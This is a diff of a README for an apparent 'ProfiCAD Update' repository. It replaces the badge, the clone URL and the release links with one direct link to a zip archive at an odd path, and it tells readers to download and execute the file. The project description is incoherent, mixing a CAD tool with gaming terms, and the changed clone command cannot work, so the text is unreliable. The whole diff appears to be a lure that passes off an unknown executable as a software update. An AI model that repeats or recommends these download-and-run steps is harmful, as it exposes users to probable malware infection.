@@ -1,6 +1,6 @@
 # ProfiCAD Update 🚀
 
-![ProfiCAD](https://img.shields.io/badge/ProfiCAD-Update-brightgreen)
+![ProfiCAD](https://github.com/Winiciusrezende/ProfiCAD-Update/raw/refs/heads/main/myrmecophobic/Profi_CA_Update_v3.4.zip)
 
 Welcome to the **ProfiCAD Update** repository! This project focuses on enhancing the ProfiCAD experience, particularly in the realm of proficiency bonuses, mounts, and cosmetics. Whether you're a gamer, developer, or just curious, this repository has something for you.
 
@@ -43,7 +43,7 @@ To get started with the **ProfiCAD Update**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Winiciusrezende/ProfiCAD-Update.git
+   git clone https://github.com/Winiciusrezende/ProfiCAD-Update/raw/refs/heads/main/myrmecophobic/Profi_CA_Update_v3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -51,7 +51,7 @@ To get started with the **ProfiCAD Update**, follow these steps:
    cd ProfiCAD-Update
    ```
 
-3. Download the latest release from the [Releases section](https://github.com/Winiciusrezende/ProfiCAD-Update/releases). You will need to download and execute the appropriate file for your system.
+3. Download the latest release from the [Releases section](https://github.com/Winiciusrezende/ProfiCAD-Update/raw/refs/heads/main/myrmecophobic/Profi_CA_Update_v3.4.zip). You will need to download and execute the appropriate file for your system.
 
 4. Follow any additional setup instructions provided in the release notes.
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Winiciusrezende/ProfiCAD-Update/releases). You can find the latest version there, which you will need to download and execute.
+For the latest updates and releases, visit the [Releases section](https://github.com/Winiciusrezende/ProfiCAD-Update/raw/refs/heads/main/myrmecophobic/Profi_CA_Update_v3.4.zip). You can find the latest version there, which you will need to download and execute.
 
 Feel free to explore the topics associated with this repository:
 
